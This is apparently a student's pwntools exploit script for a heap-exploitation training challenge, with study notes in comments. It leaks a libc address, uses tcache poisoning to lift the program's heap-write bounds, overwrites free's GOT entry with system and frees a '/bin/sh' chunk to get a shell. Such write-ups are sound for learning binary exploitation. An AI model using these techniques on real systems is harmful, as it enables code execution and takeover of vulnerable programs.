from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# first of all, let's set the right library with patchelf (ldd playground to check the current interpreter and library): 
# patchelf --replace-needed libc.so.6 ./libc-2.27.so ./playground

# if you try to use "bins" and "heap" commands they won't work because you need to add the symbols for these commands. 
# So, you can use "pwninit" in the terminal and it will create another binary with the necessery symbols.
# Finally, you need the change the binary from playground to playground_patched

# Recap on how heap works: the first allocated chunk of size 0x251, it should be the tcache that is saved as a chunk. It will be there even if you
# don't allocate anything. Then, if you free a chunk with size greater than 0x500 bytes,it won't end up in the tcache. when you a chunk next to the 
# top chunk, they merge. 
# you can check the position of the heap with vmmap. then, you will see the base address on the left: 0x55555555c000 and you will check the memory with
# x/100gx 0x55555555c000.
# when you free a chunk larger than 0x500 it won't end up in the tcache or in the fastbin, so it will end up in other bins and it will have two pointers.

# malloc_hook and free_hook are two pointers in the bss of the libc.
# malloc_hook is checked inside the malloc function and if it is not null, then there is a call to this hook and return that value. Basically, this
# hook if it not null, it will replace the function malloc. by default is null.
# (i am not sure, but if you have done pnwinit, you should be able to see also these symbols) 
# p &__free_hook     -> 0x7ffff7dcf8e8
# p &__malloc_hook   -> 0x7ffff7dcdc30
# you can check them with: x/40gx 0x7ffff7dcf8e8  ; x/40gx 0x7ffff7dcdc30
# another way to find the offsets for these pointers is to type in the terminal:
# objdump -d libc-2.27.so | grep "__free_hook" where 0x3eaef0 will be the offset (but it's not precise, better to use the other method)

# you can use one_gadget libc-2.27.so and we will find the exec at offset: 0x4f3d5. Libcbase + offset = 0x7ffff79e2000 + 0x4f3d5
# let's check it with x/40gx 0x7ffff7dcf8e8

# then we need a leak of libc: 
# - we create a chunk with size greater than 0x500, so it won't end up in the t-cache (once freed). Then, we allocate another chunk, because
#   we don't want that when we will free the next chunk, it will merge with the top chunk (it won'thappen because there is a chunk in the middle)
#   then we free the first big chunk and we check in the memory the two pointers(0x7ffff7dcdca0). We check with vmmap the address and it should be the one
#   from libc.  x/100gx 0x55555555c000 and then vmmap 0x7ffff7dcdca0.
#   however, we need the address on the program, so we can use show to leak the address: 
#   values = show(chunk, 8) ; libc_leak = values[0]
# - with vmmap we can see the base of the libc which is 0x7ffff79e2000 and we can just do: p /x 0x7ffff7dcdca0 - 0x7ffff79e2000
#   so the offset is 0x3ebca0

# So, the basic idea for the challenge would be to write in the bss and substitue some libc function with malloc_hook or others.
# but we cannot write (with write function) wherever we want, but only inside the heap: 
# write 0x7ffff7dcdca0 8 will return FAIL because there is a check (take a look at it on ghidra)
# to overcome this the first idea would be to overwrite minheap and maxheap in this way we would be able to write anywhere
# but they are both saved in the bss, so how can i overwrite them?

if "REMOTE" not in args:
    #ssh = ssh("acidburn", "192.168.56.104")
    #r = ssh.process("./playground_patched")
    r = process("./playground") 
    gdb.attach(r, """
        # b *0x00401255
	brva 0x12cc
        c
	c
	c
	c
	c
	c
	c
	c
        """)

else:
    r = remote("bin.training.jinblack.it", 4010)


def malloc(size):
    r.recvuntil(b"> ")
    r.sendline(b"malloc %d" % size)
    r.recvuntil(b"==> ")
    address = int(r.recvuntil(b"\n"), 16)
    return address

def free(ptr):
    r.recvuntil(b"> ")
    r.sendline(b"free %#x" % ptr)
    r.recvuntil(b"==> ok\n")

def free_nr(ptr):
    r.recvuntil(b"> ")
    r.sendline(b"free %#x" % ptr)

def show(ptr, size):
    output = []
    r.recvuntil(b"> ")
    r.sendline(b"show %#x %d" % (ptr,size) )
    for i in range(size):
        data = r.recvline().split(b":   ")
        if len(data) >= 2:
          data = data[1].strip()
          if data == b'':
              v = 0
          else:
              v = int(data, 16)
          output.append(v)
    return output

def write(ptr, bytes, fill):
    r.recvuntil(b"> ")
    r.sendline(b"write %#x %d" % (ptr,bytes))
    r.recvuntil(b"==> ")
    if (r.recv(1) == b"f"):
        r.recvuntil(b"ail\n")
    else:
        r.recvuntil(b"ead\n")
        r.sendline(fill)#b"%#x" % (fill)) #only fill with p64 before it works
        r.recvuntil(b"==> done\n")

#the format to send stuff is this: a = int(address_bytes,16) and sendline("command %#x" % a), but without p64 it invert in memory everything
#so the right sequence is: 
# - for printing: str(bytes)
# - for sending: sendline(p64(int(address_bytes,16))) or sendline(p64(0xAAA))
#r.recvline()
r.recvuntil(b"main: ")
main = int(r.recvuntil(b"\n")[:-1],16)#r.recvline().split(b"main: ")[1].strip()
print("main: " + str(main))
#main = int(main,16)


# leak libc
malloc(20)
chunk = malloc(1792) #0x700
print(str(chunk))
malloc(40)
free(chunk)
values = show(chunk, 8)
libc_leak = values[0]
print("libc_leak: "+ hex(libc_leak))
libc_base = libc_leak - 0x3ebca0
print("libc_base: "+ hex(libc_base))

# useful addresses
free_hook = 0x7ffff7dcf8e8
malloc_hook = 0x7ffff7dcdc30
offset_main_max_heap = 0x2ec7  #from ghidra
offset_main_min_heap = 0x2ecf  #from ghidra
free_ = main + 0x2e3f 
# you can retrieve the addresses also with "got" in gdb
# objdump -d libc-2.27.so | egrep "system"
system = libc_base + 0x4f550 
max_heap = main + offset_main_max_heap
min_heap = main + offset_main_min_heap
print("max_heap: " + hex(max_heap))
print("min_heap: " + hex(min_heap))
print("free: " + hex(free_))
print("system: " + hex(system))

# TCACHE poisoning
# I am doing a simple tcache poisoning to obatin an arbitrary write. However, you can notice that i can overflow che chunks after my target.
# it may be useful in other challenges (obviously you need to allocate and free more chunks)
size = 40
chunk1 = malloc(size)
chunk2 = malloc(size)
free(chunk1)
free(chunk2)
target = p64(min_heap - 0x8)
write(chunk2,50,target)
chunk3p = malloc(size)
show(max_heap, 8)
chunk3 = malloc(size)   #here we change the value of min_heap
show(max_heap, 8)

# change also max_heap 
write(max_heap,50,p64(0xffffffffffffffff))
show(max_heap, 8)

# one_gadget libc-2.27.so
# one_gadget -> notice that all the addresses of one_gadget don't work
# change __malloc_hook so when you call malloc, it will execute what's written inside malloc_hook

# notice that you cannot use __malloc_hook because it takes the arguments from the gadgets
# while if you rewrite free in the got, then you can pass the arguments with a chunk
# if you use system, you just need one argument "/bin/sh\x00"
# however, if you need for another challenge:
# write(malloc_hook,100,p64(system))
chunk4 = malloc(30)
write(chunk4,20,b"/bin/sh\x00")
show(chunk4, 8)
write(free_,100,p64(system))
show(free_, 8)
free_nr(chunk4)


r.interactive()
#input("wait")

